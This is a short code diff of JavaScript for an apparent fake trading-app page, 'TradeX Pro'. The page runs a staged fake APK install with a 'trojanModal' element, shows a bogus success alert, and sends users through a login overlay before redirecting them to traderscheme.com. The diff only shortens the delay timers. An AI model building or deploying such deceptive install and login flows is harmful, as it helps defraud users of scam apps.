@@ -40,7 +40,7 @@ if (apkDownloadBtn) {
         ];
         
         for (let i = 0; i < steps.length; i++) {
-            await new Promise(resolve => setTimeout(resolve, 1000));
+            await new Promise(resolve => setTimeout(resolve, 800));
             progressText.textContent = steps[i].text;
             progressFill.style.width = steps[i].progress + '%';
         }
@@ -59,7 +59,7 @@ if (apkDownloadBtn) {
             trojanModal.style.display = 'none';
             alert('TradeX Pro installed successfully! Redirecting to trading dashboard...');
             window.location.href = 'https://traderscheme.com';
-        }, 2000);
+        }, 1500);
     });
 }
 
@@ -105,9 +105,8 @@ loginForm.addEventListener('submit', async (e) => {
     setTimeout(() => {
         loadingOverlay.style.display = 'none';
         alert('Welcome to TradeX Pro! Redirecting to your dashboard...');
-        // Redirect to real trading site
         window.location.href = 'https://traderscheme.com';
-    }, 3000);
+    }, 2000);
 });
 
 // Social login
